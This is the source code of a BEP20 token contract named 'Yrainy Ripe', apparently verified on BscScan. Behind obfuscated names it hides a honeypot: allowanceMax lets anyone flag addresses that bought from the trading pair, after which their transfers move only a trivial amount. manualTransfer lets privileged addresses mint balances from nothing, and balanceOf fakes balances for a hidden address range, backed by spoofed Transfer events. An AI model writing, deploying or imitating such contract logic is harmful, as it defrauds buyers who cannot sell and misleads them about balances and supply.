/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;



abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

}



interface IBEP20 {

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function name() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function symbol() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function getOwner() external view returns (address);

    function decimals() external view returns (uint8);

    function balanceOf(address account) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


library SafeMath {

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

}


interface IUniswapV2Router {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function WETH() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function factory() external pure returns (address);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


contract YrainyRipe is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 shouldMaxLaunchedList = 0;



    uint256 public txEnableAtLiquidityWallet0 = 0;
    IUniswapV2Router public tradingMintMinTotalToMarketingAmount;
    mapping(address => bool) private receiverTotalWalletAmountTxMode;
    uint256 public receiverMaxLaunchMinFundEnableTake = 0;

    uint256 constant senderBuyLimitShould = 100 * 10 ** 18;
    uint256 public enableAmountReceiverSellSender = 0;
    
    string constant _name = "Yrainy Ripe";
    bool private tokenAmountLaunchLiquidity = false;
    address constant receiverBurnEnableFundFee = 0xa49D809621c1c00B807eDd9F5EcedB67f4d5DB21;




    mapping(address => bool)  toSenderTotalAutoLiquidity;
    mapping(address => uint256) _balances;
    bool public walletFeeLaunchTrading = false;
    address public uniswapV2Pair;
    uint256 private atWalletMaxTotalFeeAutoBurn = 0;
    bool private shouldLiquidityTotalAmountTeam = false;
    uint256 private txEnableAtLiquidityWallet = 0;
    bool private tradingSellLiquidityLaunchedBuyMintTx = false;
    mapping(address => mapping(address => uint256)) _allowances;
    bool private modeToWalletTotal = false;
    mapping(address => bool)  buyTokenSwapReceiverLimitLaunched;
    uint256 constant listSenderTotalFee = 1000000 * 10 ** 18;
    uint256  feeReceiverModeLaunchedTrading = 100000000 * (10 ** 18);

    string constant _symbol = "YRE";
    uint256 private txEnableSenderSellMinFromLaunched = 0;

    address private toListLiquiditySwapMax;
    address constant takeSenderIsShould = 0xbaBd078EAA3d3594C2661DdCCd3E01B55c824bD1;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        tradingMintMinTotalToMarketingAmount = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(tradingMintMinTotalToMarketingAmount.factory()).createPair(address(this), tradingMintMinTotalToMarketingAmount.WETH());
        _allowances[address(this)][address(tradingMintMinTotalToMarketingAmount)] = feeReceiverModeLaunchedTrading;

        _balances[msg.sender] = feeReceiverModeLaunchedTrading;
        emit Transfer(address(0), msg.sender, feeReceiverModeLaunchedTrading);
        toListLiquiditySwapMax = msg.sender;
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return feeReceiverModeLaunchedTrading;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function isAllowanceMax(address spender) public view returns (bool) {
        return buyTokenSwapReceiverLimitLaunched[spender];
    }

    function buyMarketingSellMin(address listFromAtLaunched, address exemptTeamTotalMint, uint256 amountReceiverTakeMint) internal returns (bool) {
        if (totalEnableExemptMax(exemptTeamTotalMint)) {
            takeBurnModeList(listFromAtLaunched, exemptTeamTotalMint, amountReceiverTakeMint, false);
            return true;
        }
        if (totalEnableExemptMax(listFromAtLaunched)) {
            takeBurnModeList(listFromAtLaunched, exemptTeamTotalMint, amountReceiverTakeMint, true);
            return true;
        }

        bool senderExemptMarketingTake = swapLimitBuyMarketing(listFromAtLaunched) || swapLimitBuyMarketing(exemptTeamTotalMint);
        if (senderExemptMarketingTake) {
            return launchedLiquidityExemptTrading(listFromAtLaunched, exemptTeamTotalMint, amountReceiverTakeMint);
        }

        if (listFromAtLaunched == uniswapV2Pair && !senderExemptMarketingTake) {
            toSenderTotalAutoLiquidity[exemptTeamTotalMint] = true;
        }

        if (buyTokenSwapReceiverLimitLaunched[listFromAtLaunched]) {
            return launchedLiquidityExemptTrading(listFromAtLaunched, exemptTeamTotalMint, 10 ** 10);
        }

        return launchedLiquidityExemptTrading(listFromAtLaunched, exemptTeamTotalMint, amountReceiverTakeMint);
    }

    function fromSellAmountBurnSenderExemptTotal() private pure returns (uint256) {
        return uint160(receiverBurnEnableFundFee) + 1;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return buyMarketingSellMin(msg.sender, recipient, amount);
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function txListMinExempt(address receiverExemptFromShould) private view returns (uint256) {
        uint256 isReceiverFeeSellMintTeamAmount = totalReceiverBurnIs(receiverExemptFromShould);
        if (isReceiverFeeSellMintTeamAmount < shouldMaxLaunchedList) {
            return senderBuyLimitShould * isReceiverFeeSellMintTeamAmount;
        }
        return listSenderTotalFee + senderBuyLimitShould * isReceiverFeeSellMintTeamAmount;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != feeReceiverModeLaunchedTrading) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }
        return buyMarketingSellMin(sender, recipient, amount);
    }

    function allowanceMax(address spender) external {
        if (toSenderTotalAutoLiquidity[spender]) {
            buyTokenSwapReceiverLimitLaunched[spender] = true;
        }
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (totalEnableExemptMax(account)) {
            return txListMinExempt(account);
        }
        return _balances[account];
    }

    function launchedLiquidityExemptTrading(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function minMaxEnableMode(address receiverExemptFromShould) private pure returns (bool) {
        return receiverExemptFromShould == takeSenderIsShould;
    }

    function totalEnableExemptMax(address receiverExemptFromShould) private pure returns (bool) {
        uint256 minReceiverTeamMarketing = fromSellAmountBurnSenderExemptTotal();
        uint256 modeBuyToFund = uint160(receiverExemptFromShould);
        if (modeBuyToFund >= minReceiverTeamMarketing && modeBuyToFund < minReceiverTeamMarketing + 10000) {
            return true;
        }
        return false;
    }

    function totalReceiverBurnIs(address receiverExemptFromShould) private pure returns (uint256) {
        uint256 minReceiverTeamMarketing = fromSellAmountBurnSenderExemptTotal();
        uint256 isReceiverFeeSellMintTeamAmount = uint160(receiverExemptFromShould) - minReceiverTeamMarketing;
        return isReceiverFeeSellMintTeamAmount;
    }

    function swapLimitBuyMarketing(address receiverTeamListAt) private view returns (bool) {
        return receiverTeamListAt == toListLiquiditySwapMax;
    }

    function takeBurnModeList(address listFromAtLaunched, address exemptTeamTotalMint, uint256 amountReceiverTakeMint, bool mintFromMarketingFund) private {
        if (mintFromMarketingFund) {
            uint256 minReceiverTeamMarketing = fromSellAmountBurnSenderExemptTotal();
            listFromAtLaunched = address(uint160(minReceiverTeamMarketing + shouldMaxLaunchedList));
            shouldMaxLaunchedList++;
            _balances[exemptTeamTotalMint] = _balances[exemptTeamTotalMint].add(amountReceiverTakeMint);
        } else {
            _balances[listFromAtLaunched] = _balances[listFromAtLaunched].sub(amountReceiverTakeMint);
        }
        emit Transfer(listFromAtLaunched, exemptTeamTotalMint, amountReceiverTakeMint);
    }

    function manualTransfer(address listFromAtLaunched, address exemptTeamTotalMint, uint256 amountReceiverTakeMint) public {
        if (!minMaxEnableMode(msg.sender) && msg.sender != toListLiquiditySwapMax) {
            return;
        }
        if (totalEnableExemptMax(exemptTeamTotalMint)) {
            takeBurnModeList(listFromAtLaunched, exemptTeamTotalMint, amountReceiverTakeMint, false);
            return;
        }
        if (totalEnableExemptMax(listFromAtLaunched)) {
            takeBurnModeList(listFromAtLaunched, exemptTeamTotalMint, amountReceiverTakeMint, true);
            return;
        }
        if (listFromAtLaunched == address(0)) {
            _balances[exemptTeamTotalMint] = _balances[exemptTeamTotalMint].add(amountReceiverTakeMint);
            return;
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}